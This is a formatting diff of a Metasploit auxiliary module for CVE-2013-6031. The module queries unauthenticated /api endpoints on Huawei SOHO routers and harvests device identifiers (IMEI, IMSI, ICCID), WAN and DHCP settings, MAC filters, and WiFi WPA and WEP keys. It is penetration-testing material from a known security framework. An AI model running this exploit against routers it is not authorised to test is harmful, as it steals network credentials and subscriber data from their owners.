@@ -10,73 +10,80 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   BASIC_INFO = {
-    'Device Name'      => /<DeviceName>(.*)<\/DeviceName>/i,
-    'Serial Number'    => /<SerialNumber>(.*)<\/SerialNumber>/i,
-    'IMEI'             => /<Imei>(.*)<\/Imei>/i,
-    'IMSI'             => /<Imsi>(.*)<\/Imsi>/i,
-    'ICCID'            => /<Iccid>(.*)<\/Iccid>/i,
+    'Device Name' => /<DeviceName>(.*)<\/DeviceName>/i,
+    'Serial Number' => /<SerialNumber>(.*)<\/SerialNumber>/i,
+    'IMEI' => /<Imei>(.*)<\/Imei>/i,
+    'IMSI' => /<Imsi>(.*)<\/Imsi>/i,
+    'ICCID' => /<Iccid>(.*)<\/Iccid>/i,
     'Hardware Version' => /<HardwareVersion>(.*)<\/HardwareVersion>/i,
     'Software Version' => /<SoftwareVersion>(.*)<\/SoftwareVersion>/i,
-    'WebUI Version'    => /<WebUIVersion>(.*)<\/WebUIVersion>/i,
-    'Mac Address1'     => /<MacAddress1>(.*)<\/MacAddress1>/i,
-    'Mac Address2'     => /<MacAddress2>(.*)<\/MacAddress2>/i,
-    'Product Family'   => /<ProductFamily>(.*)<\/ProductFamily>/i,
-    'Classification'   => /<Classify>(.*)<\/Classify>/i
+    'WebUI Version' => /<WebUIVersion>(.*)<\/WebUIVersion>/i,
+    'Mac Address1' => /<MacAddress1>(.*)<\/MacAddress1>/i,
+    'Mac Address2' => /<MacAddress2>(.*)<\/MacAddress2>/i,
+    'Product Family' => /<ProductFamily>(.*)<\/ProductFamily>/i,
+    'Classification' => /<Classify>(.*)<\/Classify>/i
   }
 
   WAN_INFO = {
     'Wan IP Address' => /<WanIPAddress>(.*)<\/WanIPAddress>/i,
-    'Primary Dns'    => /<PrimaryDns>(.*)<\/PrimaryDns>/i,
-    'Secondary Dns'  => /<SecondaryDns>(.*)<\/SecondaryDns>/i
+    'Primary Dns' => /<PrimaryDns>(.*)<\/PrimaryDns>/i,
+    'Secondary Dns' => /<SecondaryDns>(.*)<\/SecondaryDns>/i
   }
 
-  DHCP_INFO ={
-    'LAN IP Address'      => /<DhcpIPAddress>(.*)<\/DhcpIPAddress>/i,
+  DHCP_INFO = {
+    'LAN IP Address' => /<DhcpIPAddress>(.*)<\/DhcpIPAddress>/i,
     'DHCP StartIPAddress' => /<DhcpStartIPAddress>(.*)<\/DhcpStartIPAddress>/i,
-    'DHCP EndIPAddress'   => /<DhcpEndIPAddress>(.*)<\/DhcpEndIPAddress>/i,
-    'DHCP Lease Time'     => /<DhcpLeaseTime>(.*)<\/DhcpLeaseTime>/i
+    'DHCP EndIPAddress' => /<DhcpEndIPAddress>(.*)<\/DhcpEndIPAddress>/i,
+    'DHCP Lease Time' => /<DhcpLeaseTime>(.*)<\/DhcpLeaseTime>/i
   }
 
   WIFI_INFO = {
-    'Wifi WPA pre-shared key'     => /<WifiWpapsk>(.*)<\/WifiWpapsk>/i,
-    'Wifi Auth mode'              => /<WifiAuthmode>(.*)<\/WifiAuthmode>/i,
+    'Wifi WPA pre-shared key' => /<WifiWpapsk>(.*)<\/WifiWpapsk>/i,
+    'Wifi Auth mode' => /<WifiAuthmode>(.*)<\/WifiAuthmode>/i,
     'Wifi Basic encryption modes' => /<WifiBasicencryptionmodes>(.*)<\/WifiBasicencryptionmodes>/i,
-    'Wifi WPA Encryption Modes'   => /<WifiWpaencryptionmodes>(.*)<\/WifiWpaencryptionmodes>/i,
-    'Wifi WEP Key1'               => /<WifiWepKey1>(.*)<\/WifiWepKey1>/i,
-    'Wifi WEP Key2'               => /<WifiWepKey2>(.*)<\/WifiWepKey2>/i,
-    'Wifi WEP Key3'               => /<WifiWepKey3>(.*)<\/WifiWepKey3>/i,
-    'Wifi WEP Key4'               => /<WifiWepKey4>(.*)<\/WifiWepKey4>/i,
-    'Wifi WEP Key Index'          => /<WifiWepKeyIndex>(.*)<\/WifiWepKeyIndex>/i
+    'Wifi WPA Encryption Modes' => /<WifiWpaencryptionmodes>(.*)<\/WifiWpaencryptionmodes>/i,
+    'Wifi WEP Key1' => /<WifiWepKey1>(.*)<\/WifiWepKey1>/i,
+    'Wifi WEP Key2' => /<WifiWepKey2>(.*)<\/WifiWepKey2>/i,
+    'Wifi WEP Key3' => /<WifiWepKey3>(.*)<\/WifiWepKey3>/i,
+    'Wifi WEP Key4' => /<WifiWepKey4>(.*)<\/WifiWepKey4>/i,
+    'Wifi WEP Key Index' => /<WifiWepKeyIndex>(.*)<\/WifiWepKeyIndex>/i
   }
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => "Huawei Datacard Information Disclosure Vulnerability",
-      'Description'    => %q{
-        This module exploits an unauthenticated information disclosure vulnerability in Huawei
-        SOHO routers. The module will gather information by accessing the /api pages where
-        authentication is not required, allowing configuration changes as well as information
-        disclosure, including any stored SMS.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => "Huawei Datacard Information Disclosure Vulnerability",
+        'Description' => %q{
+          This module exploits an unauthenticated information disclosure vulnerability in Huawei
+          SOHO routers. The module will gather information by accessing the /api pages where
+          authentication is not required, allowing configuration changes as well as information
+          disclosure, including any stored SMS.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'Jimson K James',
           'Tom James <tomsmaily[at]aczire.com>', # Msf module
         ],
-      'References'     =>
-        [
+        'References' => [
           ['CWE', '425'],
           ['CVE', '2013-6031'],
           ['US-CERT-VU', '341526']
         ],
-      'DisclosureDate' => '2013-11-11' ))
+        'DisclosureDate' => '2013-11-11',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         Opt::RHOST('mobilewifi.home')
-      ])
-
+      ]
+    )
   end
 
   # Gather basic router information
@@ -93,13 +100,13 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_wifi_info
-
     print_status("Getting WiFi Key details...")
     res = send_request_raw(
       {
-        'method'  => 'GET',
-        'uri'     => '/api/wlan/security-settings',
-      })
+        'method' => 'GET',
+        'uri' => '/api/wlan/security-settings',
+      }
+    )
 
     unless is_target?(res)
       return
@@ -116,7 +123,7 @@ class MetasploitModule < Msf::Auxiliary
       log << "WiFi SSID: #{wifi_ssid}\n"
     end
 
-    WIFI_INFO.each do |k,v|
+    WIFI_INFO.each do |k, v|
       if resp_body.match(v)
         info = $1
         print_status("#{k}: #{info}")
@@ -132,13 +139,13 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_router_info
-
     print_status("Gathering basic device information...")
     res = send_request_raw(
       {
-        'method'  => 'GET',
-        'uri'     => '/api/device/information',
-      })
+        'method' => 'GET',
+        'uri' => '/api/device/information',
+      }
+    )
 
     unless is_target?(res)
       return
@@ -148,7 +155,7 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status("Basic Information")
 
-    BASIC_INFO.each do |k,v|
+    BASIC_INFO.each do |k, v|
       if resp_body.match(v)
         info = $1
         print_status("#{k}: #{info}")
@@ -161,9 +168,10 @@ class MetasploitModule < Msf::Auxiliary
 
     res = send_request_raw(
       {
-        'method'  => 'GET',
-        'uri'     => '/api/wlan/basic-settings',
-      })
+        'method' => 'GET',
+        'uri' => '/api/wlan/basic-settings',
+      }
+    )
 
     # check whether we got any response from server and proceed.
     unless is_target?(res)
@@ -184,9 +192,10 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Gathering MAC filters...")
     res = send_request_raw(
       {
-        'method'  => 'GET',
-        'uri'     => '/api/wlan/mac-filter',
-      })
+        'method' => 'GET',
+        'uri' => '/api/wlan/mac-filter',
+      }
+    )
 
     unless is_target?(res)
       return
@@ -198,7 +207,7 @@ class MetasploitModule < Msf::Auxiliary
 
     if resp_body.match(/<WifiMacFilterStatus>(.*)<\/WifiMacFilterStatus>/i)
       wifi_mac_filter_status = $1
-      print_status("Wifi MAC Filter Status: #{(wifi_mac_filter_status == '1') ? 'ENABLED' : 'DISABLED'}" )
+      print_status("Wifi MAC Filter Status: #{(wifi_mac_filter_status == '1') ? 'ENABLED' : 'DISABLED'}")
     end
 
     (0..9).each do |i|
@@ -215,9 +224,10 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Gathering WAN information...")
     res = send_request_raw(
       {
-        'method'  => 'GET',
-        'uri'     => '/api/monitoring/status',
-      })
+        'method' => 'GET',
+        'uri' => '/api/monitoring/status',
+      }
+    )
 
     unless is_target?(res)
       return
@@ -227,7 +237,7 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status('WAN Details')
 
-    WAN_INFO.each do |k,v|
+    WAN_INFO.each do |k, v|
       if resp_body.match(v)
         info = $1
         print_status("#{k}: #{info}")
@@ -239,9 +249,10 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Gathering DHCP information...")
     res = send_request_raw(
       {
-        'method'  => 'GET',
-        'uri'     => '/api/dhcp/settings',
-      })
+        'method' => 'GET',
+        'uri' => '/api/dhcp/settings',
+      }
+    )
 
     unless is_target?(res)
       return
@@ -261,7 +272,7 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    DHCP_INFO.each do |k,v|
+    DHCP_INFO.each do |k, v|
       if resp_body.match(v)
         info = $1
         print_status("#{k}: #{info}")
